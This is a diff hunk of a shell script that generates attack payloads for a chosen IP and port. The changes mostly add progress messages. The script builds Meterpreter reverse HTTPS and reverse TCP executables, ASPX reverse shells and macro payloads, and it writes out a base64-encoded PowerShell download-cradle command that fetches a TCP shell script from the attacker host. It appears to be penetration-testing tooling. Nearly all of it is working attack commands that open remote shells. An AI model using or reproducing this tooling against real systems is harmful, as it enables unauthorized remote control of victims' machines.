@@ -115,19 +115,26 @@ python3 invoke-shellcode.py ${IP} ${PORT}
 
 echo '(New-Object Net.WebClient).DownloadString("http://${IP}/Invoke-PowerShellTcpRun.ps1")' | iconv -t utf-16le | base64 -w 0
 
+echo "[+] Generate METH reverse HTTPS payload for ${IP} on port ${PORT}"
 echo '#METERPRETER (reverse_https)' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 meterpreter.py ${IP} ${PORT}
 cp meuk/meth/bin/Debug/meth.exe http/payloads/${BESTAND}_meth.exe
-
+echo "[+] Generate METH reverse TCP payload for ${IP} on port ${PORT}"
 python3 meterpreter.py ${IP} ${PORT} windows/x64/shell_reverse_tcp
 cp meuk/meth/bin/Debug/meth.exe http/payloads/methtcp.exe
 
 
-echo "ASPX reverse https shell :)"
+echo "[+] Generate ASPX reverse HTTPS shell"
 python3 methaspx.py ${IP} ${PORT}
 
+echo "[+] Generate ASPX reverse TCP shell"
+python3 methaspx.py ${IP} ${PORT}
+
+
+echo "[+] Building MACRO txt"
 echo '#MACRO' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 macro.py ${IP} ${PORT}
+echo "[+] Done"
 
 
 
